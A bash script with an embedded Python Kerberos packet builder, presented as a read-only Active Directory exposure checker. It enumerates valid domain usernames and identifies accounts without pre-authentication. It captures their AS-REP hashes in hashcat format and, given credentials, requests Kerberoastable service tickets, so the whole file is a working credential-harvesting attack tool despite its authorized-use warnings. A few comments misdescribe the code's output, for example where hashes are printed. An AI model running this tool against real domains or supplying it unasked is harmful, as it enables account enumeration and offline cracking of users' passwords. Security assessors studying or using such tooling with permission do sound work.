#!/usr/bin/env bash
#
# kerb-audit.sh — read-only Kerberos (AD) pre-auth / roasting exposure checker
# =============================================================================
#   Pre-authentication is the only credential-free view into a KDC. For a given
#   realm + domain controller and a list of candidate usernames this helper:
#     * validates    — which usernames are real accounts (AS-REQ probing)
#     * pre-auth      — which valid accounts do NOT require Kerberos pre-auth
#     * AS-REP roast  — captures the AS-REP hash for those accounts (hashcat
#                       mode 18200) so you can feed creds/hash-triage
#     * SPN discovery — lists Kerberoastable service accounts (needs creds;
#                       hashcat mode 13100 when roasted)
#   Default backend is nmap NSE (krb5-enum-users) for account validity; a
#   built-in python3 AS-REQ prober adds the pre-auth / AS-REP-hash detail nmap
#   cannot give. `kerbrute` and Impacket (GetNPUsers / GetUserSPNs) are used
#   when present. No pre-auth account enumeration needs no credentials.
#   Only test realms you own or are explicitly authorized to assess. Username
#   probing writes event 4768 on every DC — it is NOT stealthy.
# =============================================================================
#
#   Requires: python3 (universal). Optional/preferred: nmap, kerbrute,
#             impacket-scripts (GetNPUsers.py, GetUserSPNs.py).
#
#   Quick start:
#     ./kerb-audit.sh -r CORP.LOCAL -d dc01.corp.local -u users.txt
#     ./kerb-audit.sh -r CORP.LOCAL -d 10.0.0.5 --user alice --user bob
#     ./kerb-audit.sh -r CORP.LOCAL -d dc01 -u users.txt --json
#     ./kerb-audit.sh -r CORP.LOCAL -d dc01 --creds 'svc_acct:Passw0rd!' --spn
#
set -uo pipefail

REALM=""
DC=""
PORT=88
TIMEOUT=8
JSON=0
DO_SPN=0
ROAST=0
PREFER_NMAP=1
CREDS=""
USERS=()
EXIT_CODE=0

if [[ -t 1 && "${NO_COLOR:-}" == "" ]]; then
    C_RST=$'\e[0m'; C_R=$'\e[31m'; C_G=$'\e[32m'; C_Y=$'\e[33m'
    C_B=$'\e[34m'; C_C=$'\e[36m'; C_BOLD=$'\e[1m'; C_DIM=$'\e[2m'
else
    C_RST=""; C_R=""; C_G=""; C_Y=""; C_B=""; C_C=""; C_BOLD=""; C_DIM=""
fi
info()    { printf '%s[*]%s %s\n'  "${C_B}"   "${C_RST}" "$*"; }
ok()      { printf '%s[+]%s %s\n'  "${C_G}"   "${C_RST}" "$*"; }
warn()    { printf '%s[!]%s %s\n'  "${C_Y}"   "${C_RST}" "$*"; }
err()     { printf '%s[x]%s %s\n'  "${C_R}"   "${C_RST}" "$*"; }
field()   { printf '    %s%-16s%s %s\n' "${C_DIM}" "$1" "${C_RST}" "$2"; }
section() { printf '\n%s%s== %s ==%s\n' "${C_BOLD}" "${C_C}" "$*" "${C_RST}"; }
have()    { command -v "$1" >/dev/null 2>&1; }
jesc()    { local s="${1//$'\r'/}"; s="${s//$'\t'/ }"; s="${s//\\/\\\\}"; s="${s//\"/\\\"}"; s="${s//$'\n'/ }"; printf '%s' "$s"; }

usage() { sed -n '2,33p' "$0" | sed 's/^# \{0,1\}//'; }

while [[ $# -gt 0 ]]; do
    case "$1" in
        -r|--realm)   REALM="${2:?}"; shift 2 ;;
        -d|--dc)      DC="${2:?}"; shift 2 ;;
        -u|--users)
            [[ -z "${2:-}" ]] && { err "missing FILE"; exit 2; }
            while IFS= read -r l; do l="${l%%#*}"; l="${l//[[:space:]]/}"; [[ -n "$l" ]] && USERS+=("$l"); done < "$2"
            shift 2 ;;
        --user)       USERS+=("${2:?}"); shift 2 ;;
        --creds)      CREDS="${2:?}"; shift 2 ;;
        --spn)        DO_SPN=1; shift ;;
        --roast)      DO_SPN=1; ROAST=1; shift ;;
        -p|--port)    PORT="${2:?}"; shift 2 ;;
        -t|--timeout) TIMEOUT="${2:?}"; shift 2 ;;
        --no-nmap)    PREFER_NMAP=0; shift ;;
        --json)       JSON=1; shift ;;
        -h|--help)    usage; exit 0 ;;
        -*)           err "unknown option: $1"; usage; exit 2 ;;
        *)            [[ -z "$REALM" ]] && REALM="$1" || { [[ -z "$DC" ]] && DC="$1" || USERS+=("$1"); }; shift ;;
    esac
done

[[ -z "$REALM" ]] && { err "no realm given (-r CORP.LOCAL)"; usage; exit 2; }
[[ -z "$DC"    ]] && { err "no domain controller given (-d dc01.corp.local)"; usage; exit 2; }
have python3 || { err "python3 is required (universal AS-REQ backend)"; exit 2; }
REALM_UC="$(printf '%s' "$REALM" | tr '[:lower:]' '[:upper:]')"

# de-dup username list
if [[ ${#USERS[@]} -gt 0 ]]; then
    mapfile -t USERS < <(printf '%s\n' "${USERS[@]}" | awk 'NF && !seen[$0]++')
fi

# =============================================================================
# Embedded minimal Kerberos AS-REQ prober (stdlib only). Sends a pre-auth-less
# AS-REQ per principal over TCP/88 and classifies the KDC reply:
#   AS-REP (0x6b)              -> account valid AND pre-auth NOT required
#                                 (AS-REP-roastable; the reply carries the hash)
#   KRB-ERROR 25 (PREAUTH_REQ) -> account valid, pre-auth enforced
#   KRB-ERROR 6  (C_PRINC_UNK) -> account does not exist
#   KRB-ERROR 68 (WRONG_REALM) -> realm is wrong
#   KRB-ERROR 18 (CLIENT_REVOKED) -> account valid but disabled/locked
# Sub-commands:
#   probe  REALM DC PORT TIMEOUT                  one bogus principal (realm/up)
#   enum   REALM DC PORT TIMEOUT  < users-on-stdin  one JSON line per user
# =============================================================================
read -r -d '' KRB_PY <<'PYEOF' || true
import sys, socket, struct, json, random, datetime

def enc_len(n):
    if n < 0x80: return bytes([n])
    b = b""
    while n: b = bytes([n & 0xFF]) + b; n >>= 8
    return bytes([0x80 | len(b)]) + b

def tlv(tag, c): return bytes([tag]) + enc_len(len(c)) + c
def ctx(n, c):   return tlv(0xA0 | n, c)
def SEQ(c):      return tlv(0x30, c)
def SEQOF(items):return tlv(0x30, b"".join(items))

def enc_int(n):
    if n == 0: return b"\x00"
    b = b""; v = n
    while v: b = bytes([v & 0xFF]) + b; v >>= 8
    if b[0] & 0x80: b = b"\x00" + b
    return b
def INT(n):   return tlv(0x02, enc_int(n))
def GSTR(s):  return tlv(0x1b, s.encode())            # GeneralString
def GTIME(s): return tlv(0x18, s.encode())            # GeneralizedTime

def principal(ntype, names):
    return SEQ(ctx(0, INT(ntype)) + ctx(1, SEQOF([GSTR(n) for n in names])))

def as_req(user, realm):
    kdc_opts = ctx(0, tlv(0x03, b"\x00\x40\x81\x00\x10"))     # fwd/renew/renew-ok
    cname    = ctx(1, principal(1, [user]))                    # NT-PRINCIPAL
    realm_f  = ctx(2, GSTR(realm))
    sname    = ctx(3, principal(2, ["krbtgt", realm]))         # NT-SRV-INST
    till     = ctx(5, GTIME("20370913024805Z"))
    nonce    = ctx(7, INT(random.randint(0, 0x7fffffff)))
    etypes   = ctx(8, SEQOF([INT(23), INT(18), INT(17)]))      # RC4, AES256, AES128
    body     = ctx(4, SEQ(kdc_opts + cname + realm_f + sname + till + nonce + etypes))
    kdc_req  = SEQ(ctx(1, INT(5)) + ctx(2, INT(10)) + body)    # pvno=5 msg-type=10
    return tlv(0x6a, kdc_req)                                  # [APPLICATION 10]

def rd_len(buf, i):
    l = buf[i]; i += 1
    if l & 0x80:
        n = l & 0x7F; l = 0
        for _ in range(n): l = (l << 8) | buf[i]; i += 1
    return l, i
def rd_tlv(buf, i):
    tag = buf[i]; i += 1
    length, i = rd_len(buf, i)
    return tag, buf[i:i + length], i + length
def find_ctx(seq, want):
    i = 0
    while i < len(seq):
        tag, c, i = rd_tlv(seq, i)
        if tag == want: return c
    return None

def send_asreq(host, port, timeout, user, realm):
    pkt = as_req(user, realm)
    s = socket.create_connection((host, port), timeout); s.settimeout(timeout)
    s.sendall(struct.pack(">I", len(pkt)) + pkt)
    ln = s.recv(4)
    if len(ln) < 4: s.close(); return None
    need = struct.unpack(">I", ln)[0]; data = b""
    while len(data) < need:
        c = s.recv(need - len(data))
        if not c: break
        data += c
    s.close(); return data

def classify(data, user, realm):
    out = {"user": user, "status": "unknown", "error_code": None, "etype": None, "hash": None}
    if not data: out["status"] = "no-response"; return out
    tag, app, _ = rd_tlv(data, 0)
    _, seqc, _ = rd_tlv(app, 0)
    if tag == 0x7e:                                   # KRB-ERROR
        ec = find_ctx(seqc, 0xA6)
        code = int.from_bytes(rd_tlv(ec, 0)[1], "big") if ec else -1
        out["error_code"] = code
        out["status"] = {6: "invalid", 25: "valid", 68: "wrong-realm",
                         18: "revoked", 37: "clock-skew"}.get(code, "valid")
    elif tag == 0x6b:                                 # AS-REP -> no pre-auth
        out["status"] = "valid-nopreauth"
        try:
            enc = find_ctx(seqc, 0xA6)
            _, encdata, _ = rd_tlv(enc, 0)
            etype = int.from_bytes(rd_tlv(find_ctx(encdata, 0xA0), 0)[1], "big")
            cipher = rd_tlv(find_ctx(encdata, 0xA2), 0)[1]
            out["etype"] = etype
            if etype == 23 and len(cipher) > 16:
                out["hash"] = "$krb5asrep$23$%s@%s:%s$%s" % (
                    user, realm, cipher[:16].hex(), cipher[16:].hex())
            else:
                out["hash"] = "$krb5asrep$%d$%s@%s$%s" % (etype, user, realm, cipher.hex())
        except Exception:
            pass
    return out

def main():
    cmd, realm, host, port, timeout = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]), float(sys.argv[5])
    if cmd == "probe":
        u = "arsenal-krb-probe-%d" % random.randint(10000, 99999)
        try:
            data = send_asreq(host, port, timeout, u, realm)
            r = classify(data, u, realm)
            print(json.dumps({"reachable": data is not None,
                              "realm_ok": r["error_code"] != 68,
                              "error_code": r["error_code"]}))
        except Exception as e:
            print(json.dumps({"reachable": False, "realm_ok": None, "error": str(e)}))
    elif cmd == "enum":
        for line in sys.stdin:
            u = line.strip()
            if not u: continue
            try:
                print(json.dumps(classify(send_asreq(host, port, timeout, u, realm), u, realm)))
            except Exception as e:
                print(json.dumps({"user": u, "status": "error", "error": str(e)}))
            sys.stdout.flush()
    else:
        print("{}")

try:
    main()
except Exception as e:
    print(json.dumps({"error": str(e)}))
PYEOF

krb_py() { python3 -c "$KRB_PY" "$@" 2>/dev/null; }
jget() { JS="$1" KEY="$2" python3 -c '
import os, json
try: d = json.loads(os.environ["JS"])
except Exception: d = {}
v = d.get(os.environ["KEY"])
print("" if v is None else ("true" if v is True else ("false" if v is False else v)))
' 2>/dev/null; }

# =============================================================================
# main
# =============================================================================
[[ ${JSON} -eq 0 ]] && {
    bk="python3 AS-REQ"; { [[ ${PREFER_NMAP} -eq 1 ]] && have nmap; } && bk="nmap krb5-enum-users + python3"
    have GetNPUsers.py && bk="impacket GetNPUsers"; have kerbrute && bk="kerbrute"
    info "kerb-audit — realm=${REALM_UC} dc=${DC} users=${#USERS[@]} backend=${bk}"
    warn "authorized-use only; AS-REQ probing logs event 4768 on the DC (noisy)"
}

problems=()
valid_users=()
roastable=()
roast_hashes=()
kerberoastable=()
backend="none"

# --- reachability + realm validation (python AS-REQ, universal) --------------
probe_j="$(krb_py probe "$REALM_UC" "$DC" "$PORT" "$TIMEOUT")"
reachable="$(jget "$probe_j" reachable)"
realm_ok="$(jget "$probe_j" realm_ok)"
if [[ "$reachable" != "true" ]]; then
    if [[ ${JSON} -eq 1 ]]; then
        printf '{"tool":"kerb-audit","host":"%s","port":%s,"realm":"%s","reachable":false,"problems":["no KDC response on %s/tcp (host down, filtered, or not a KDC)"]}\n' \
            "$(jesc "$DC")" "$PORT" "$(jesc "$REALM_UC")" "$PORT"
    else
        err "no KDC response on ${PORT}/tcp (host down, filtered, or not a KDC)"
    fi
    exit 1
fi
[[ "$realm_ok" == "false" ]] && problems+=("HIGH: wrong Kerberos realm '${REALM_UC}' (KDC returned WRONG_REALM) — fix the realm before enumerating")

# --- account validity + pre-auth status --------------------------------------
# Engine preference: Impacket GetNPUsers > kerbrute > nmap(validity)+python(preauth)
run_native_getnpusers() {
    local out
    backend="impacket GetNPUsers"
    local uf; uf="$(mktemp)"; printf '%s\n' "${USERS[@]}" > "$uf"
    out="$(GetNPUsers.py "${REALM_UC}/" -no-pass -usersfile "$uf" -dc-ip "$DC" -format hashcat 2>/dev/null)"
    rm -f "$uf"
    local u h
    while IFS= read -r h; do
        [[ "$h" == '$krb5asrep$'* ]] || continue
        roast_hashes+=("$h")
        u="$(printf '%s' "$h" | sed -E 's/.*\$[0-9]+\$([^@:$]+)[@:].*/\1/')"
        [[ -n "$u" ]] && { roastable+=("$u"); valid_users+=("$u"); }
    done <<< "$out"
    # users that exist but require pre-auth are reported as such by GetNPUsers
    while IFS= read -r u; do
        valid_users+=("$u")
    done < <(printf '%s\n' "$out" | sed -n "s/.*User \\([^ ]*\\) doesn't have.*/\\1/p")
}

run_kerbrute() {
    local out
    backend="kerbrute userenum"
    local uf; uf="$(mktemp)"; printf '%s\n' "${USERS[@]}" > "$uf"
    out="$(kerbrute userenum --dc "$DC" -d "$REALM_UC" "$uf" 2>/dev/null)"
    rm -f "$uf"
    local line u h
    while IFS= read -r line; do
        if [[ "$line" == *'VALID USERNAME:'* ]]; then
            u="$(printf '%s' "$line" | sed -E 's/.*VALID USERNAME:[[:space:]]*([^@[:space:]]+).*/\1/')"
            [[ -n "$u" ]] && valid_users+=("$u")
        elif [[ "$line" == '$krb5asrep$'* || "$line" == *'$krb5asrep$'* ]]; then
            h="$(printf '%s' "$line" | grep -oE '\$krb5asrep\$[^[:space:]]+')"
            [[ -n "$h" ]] && { roast_hashes+=("$h"); u="$(printf '%s' "$h" | sed -E 's/.*\$[0-9]+\$([^@:$]+)[@:].*/\1/')"; roastable+=("$u"); }
        fi
    done <<< "$out"
}

run_nmap_validity() {
    # nmap NSE is the default validity backend; writes userdb from our list.
    local uf out
    uf="$(mktemp)"; printf '%s\n' "${USERS[@]}" > "$uf"
    out="$(nmap -Pn -n -p "$PORT" --script krb5-enum-users \
           --script-args "krb5-enum-users.realm=${REALM_UC},userdb=${uf}" \
           --host-timeout "$((TIMEOUT * 6))s" "$DC" 2>/dev/null)"
    rm -f "$uf"
    local u
    while IFS= read -r u; do
        u="${u%@*}"; [[ -n "$u" ]] && valid_users+=("$u")
    done < <(printf '%s\n' "$out" | sed -n 's/^|[_ ]*\([^ ]*@[^ ]*\).*/\1/p')
}

# enrich: for each candidate, python AS-REQ gives pre-auth status + AS-REP hash
run_python_enum() {   # args: list of users
    local uj u st h
    while IFS= read -r uj; do
        [[ -z "$uj" ]] && continue
        st="$(jget "$uj" status)"; u="$(jget "$uj" user)"; h="$(jget "$uj" hash)"
        case "$st" in
            valid-nopreauth)
                valid_users+=("$u"); roastable+=("$u")
                [[ -n "$h" ]] && roast_hashes+=("$h") ;;
            valid|revoked|clock-skew)
                valid_users+=("$u") ;;
        esac
    done < <(printf '%s\n' "$@" | tr ' ' '\n' | grep -v '^$' | krb_py enum "$REALM_UC" "$DC" "$PORT" "$TIMEOUT")
}

if [[ ${#USERS[@]} -gt 0 ]]; then
    if have GetNPUsers.py; then
        run_native_getnpusers
    elif have kerbrute; then
        run_kerbrute
    else
        # default: nmap validity (if present) + python AS-REQ for pre-auth/hash
        if [[ ${PREFER_NMAP} -eq 1 ]] && have nmap; then
            backend="nmap krb5-enum-users + python3 AS-REQ"
            run_nmap_validity
        else
            backend="python3 AS-REQ"
        fi
        run_python_enum "${USERS[@]}"
    fi
else
    warn "no usernames supplied (-u FILE / --user NAME): skipping account enumeration"
fi

# de-dup result arrays
dedup() { [[ $# -eq 0 ]] && return; printf '%s\n' "$@" | awk 'NF && !seen[$0]++'; }
mapfile -t valid_users   < <(dedup "${valid_users[@]:-}")
mapfile -t roastable     < <(dedup "${roastable[@]:-}")
mapfile -t roast_hashes  < <(dedup "${roast_hashes[@]:-}")

[[ ${#valid_users[@]} -gt 0 ]] && problems+=("INFO: ${#valid_users[@]} valid account(s) confirmed via Kerberos (builds a spraying / targeting list)")
[[ ${#roastable[@]}   -gt 0 ]] && problems+=("HIGH: ${#roastable[@]} account(s) do NOT require Kerberos pre-auth — AS-REP-roastable (offline crack, hashcat -m 18200): ${roastable[*]}")

# --- SPN discovery / Kerberoasting (needs credentials) -----------------------
if [[ ${DO_SPN} -eq 1 ]]; then
    if [[ -n "$CREDS" ]] && have GetUserSPNs.py; then
        backend="${backend}; GetUserSPNs"
        duser="${CREDS%%:*}"; dpass="${CREDS#*:}"
        args=("${REALM_UC}/${duser}:${dpass}" -dc-ip "$DC")
        [[ ${ROAST} -eq 1 ]] && args+=(-request)
        spn_out="$(GetUserSPNs.py "${args[@]}" 2>/dev/null)"
        while IFS= read -r line; do
            sp="$(printf '%s' "$line" | awk '/\// && $1 ~ /\// {print $1}')"
            [[ -n "$sp" && "$sp" == */* ]] && kerberoastable+=("$sp")
        done <<< "$spn_out"
        if [[ ${ROAST} -eq 1 ]]; then
            while IFS= read -r h; do [[ "$h" == '$krb5tgs$'* ]] && roast_hashes+=("$h"); done \
                < <(printf '%s\n' "$spn_out" | grep -oE '\$krb5tgs\$[^[:space:]]+')
        fi
        mapfile -t kerberoastable < <(dedup "${kerberoastable[@]:-}")
        [[ ${#kerberoastable[@]} -gt 0 ]] && problems+=("HIGH: ${#kerberoastable[@]} Kerberoastable SPN account(s) (service tickets crackable offline, hashcat -m 13100)${ROAST:+ — tickets requested}")
    else
        problems+=("INFO: SPN/Kerberoast discovery needs valid domain creds — run 'GetUserSPNs.py ${REALM_UC}/USER:PASS -dc-ip ${DC} -request' (hashcat -m 13100), or check ldap-audit.sh anon-enum for servicePrincipalName=* accounts")
    fi
fi

[[ ${#problems[@]} -gt 0 ]] && EXIT_CODE=1

# --- output ------------------------------------------------------------------
jarr() { local first=1 x out=""; for x in "$@"; do [[ -z "$x" ]] && continue; [[ $first -eq 0 ]] && out+=","; out+="\"$(jesc "$x")\""; first=0; done; printf '%s' "$out"; }

if [[ ${JSON} -eq 1 ]]; then
    pj=""; first=1
    for p in "${problems[@]:-}"; do [[ -z "$p" ]] && continue; [[ $first -eq 0 ]] && pj+=","; pj+="\"$(jesc "$p")\""; first=0; done
    printf '{"tool":"kerb-audit","host":"%s","port":%s,"realm":"%s","reachable":true,"backend":"%s",' \
        "$(jesc "$DC")" "$PORT" "$(jesc "$REALM_UC")" "$(jesc "$backend")"
    printf '"valid_users":[%s],"asrep_roastable":[%s],"asrep_hashes":%s,"kerberoastable":[%s],"problems":[%s]}\n' \
        "$(jarr "${valid_users[@]:-}")" "$(jarr "${roastable[@]:-}")" "${#roast_hashes[@]}" \
        "$(jarr "${kerberoastable[@]:-}")" "$pj"
else
    section "${DC} (realm ${REALM_UC})"
    field "KDC port"   "${PORT}/tcp reachable"
    field "Realm"      "$([[ "$realm_ok" == "false" ]] && echo "WRONG (KDC rejected)" || echo "accepted")"
    field "Valid users" "${#valid_users[@]}${valid_users:+ — ${valid_users[*]}}"
    field "Roastable"   "${#roastable[@]}${roastable:+ — ${roastable[*]}}"
    [[ ${#roast_hashes[@]} -gt 0 ]] && field "Hashes" "${#roast_hashes[@]} captured (see --json for the hash strings)"
    [[ ${DO_SPN} -eq 1 ]] && field "Kerberoastable" "${#kerberoastable[@]}${kerberoastable:+ — ${kerberoastable[*]}}"
    if [[ ${#problems[@]} -eq 0 ]]; then ok "no Kerberos exposures detected for the supplied input"
    else for p in "${problems[@]}"; do warn "$p"; done; fi
    # emit captured hashes to stderr so stdout stays clean for the report
    if [[ ${#roast_hashes[@]} -gt 0 ]]; then
        section "captured hashes (crack offline — authorized engagements only)"
        for h in "${roast_hashes[@]}"; do printf '    %s\n' "$h"; done
    fi
fi
exit "${EXIT_CODE}"
